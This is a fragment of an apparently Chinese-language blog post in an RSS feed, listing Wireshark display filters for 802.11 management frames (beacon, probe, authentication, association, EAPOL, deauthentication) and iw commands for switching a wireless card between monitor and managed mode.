+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type_subtype &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 8&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查找来自ap的探测请求帧&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type_subtype &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查找来自ap的探测响应帧&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type_subtype &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查找客户端和接入点之间的身份验证过程&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type_subtype &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 11&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查找请求后的关联请求&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type_subtype &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查找请求后的关联响应&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type_subtype &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果网络使用wpa2，可以使用EAPOL查看握手帧&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;eapol
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看取消关联帧或者身份验证帧&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type_subtype &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 12&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; or &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wlan.fc.type_subtype &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 10&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;切换网卡监听模式并恢复&#34;&gt;切换网卡监听模式并恢复
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip link set wlan0 down &lt;span style=&#34;color:#75715e&#34;&gt;#关闭网卡&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo iw dev wlan0 set type monitor &lt;span style=&#34;color:#75715e&#34;&gt;#将网卡设置为监听模式&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;or
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo iw dev wlan0 set type managed &lt;span style=&#34;color:#75715e&#34;&gt;#将网卡设置为普通模式&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip link set wlan0 up &lt;span style=&#34;color:#75715e&#34;&gt;#启动网卡&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;iwconfig wlan0 &lt;span style=&#34;color:#75715e&#34;&gt;#查看当前网卡模式&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
         </item>
         <item>
